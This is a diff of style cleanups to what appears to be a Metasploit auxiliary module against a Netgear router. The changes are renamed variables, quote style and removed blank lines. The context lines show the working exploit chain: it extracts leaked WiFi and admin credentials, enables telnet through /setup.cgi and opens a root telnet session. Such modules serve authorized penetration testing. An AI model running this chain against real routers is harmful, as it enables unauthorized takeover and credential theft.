@@ -143,7 +143,7 @@ class MetasploitModule < Msf::Auxiliary
       fail_with(Failure::UnexpectedReply, 'Application did not respond with the expected admin username in its response!')
     end
     wifi_password = leaked_info_array[0]
-    wifi_password_5G = leaked_info_array[1]
+    wifi_password_5g = leaked_info_array[1]
     username = leaked_info_array[2]
     password = leaked_info_array[3]
 
@@ -156,7 +156,7 @@ class MetasploitModule < Msf::Auxiliary
     if html_response.xpath('//div[@id="network_name_5G"]/following-sibling::div/child::text()').empty?
       fail_with(Failure::UnexpectedReply, 'Application did not respond with an 5G SSID in its response!')
     else
-      wifi_ssid_5G = html_response.xpath('//div[@id="network_name_5G"]/following-sibling::div/child::text()').text
+      wifi_ssid_5g = html_response.xpath('//div[@id="network_name_5G"]/following-sibling::div/child::text()').text
     end
 
     if username.empty? || password.empty?
@@ -165,14 +165,13 @@ class MetasploitModule < Msf::Auxiliary
 
     print_good("Can log into target router using username #{username} and password #{password}")
 
-    if wifi_ssid_5G.empty? || wifi_password_5G.empty?
-      print_warning("5G SSID information contained blank strings, information might be invalid!")
+    if wifi_ssid_5g.empty? || wifi_password_5g.empty?
+      print_warning('5G SSID information contained blank strings, information might be invalid!')
     end
 
     if wifi_ssid.empty? || wifi_password.empty?
-      print_warning("5G SSID information contained blank strings, information might be invalid!")
+      print_warning('5G SSID information contained blank strings, information might be invalid!')
     end
-
 
     print_status('Attempting to retrieve /top.html to verify we are logged in!')
 
@@ -240,7 +239,6 @@ class MetasploitModule < Msf::Auxiliary
 
     create_credential_login(login_data)
 
-
     print_status('Enabling telnet on the target router...')
     res = send_request_cgi(
       'uri' => '/setup.cgi',
@@ -259,12 +257,12 @@ class MetasploitModule < Msf::Auxiliary
     unless /Debug Enable!/.match(res&.body) # Since this is a one liner response, we don't use XPath searches here and instead resort to a plain regex match.
       fail_with(Failure::UnexpectedReply, 'Target did not enable debug mode for some reason!')
     end
-    print_good("Telnet enabled on target router!")
+    print_good('Telnet enabled on target router!')
     handler = framework.modules.create('auxiliary/scanner/telnet/telnet_login')
     handler.datastore['RHOSTS'] = datastore['RHOST']
     file_handle = File.open('netgear_pnpx_wordlist.txt', 'w')
     file_handle.write("#{username} #{password}")
-    file_handle.close()
+    file_handle.close
     handler.datastore['USERPASS_FILE'] = 'netgear_pnpx_wordlist.txt'
     print_status("Attempting to log in with #{username}:#{password}. You should get a new telnet session as the root user")
     handler.run
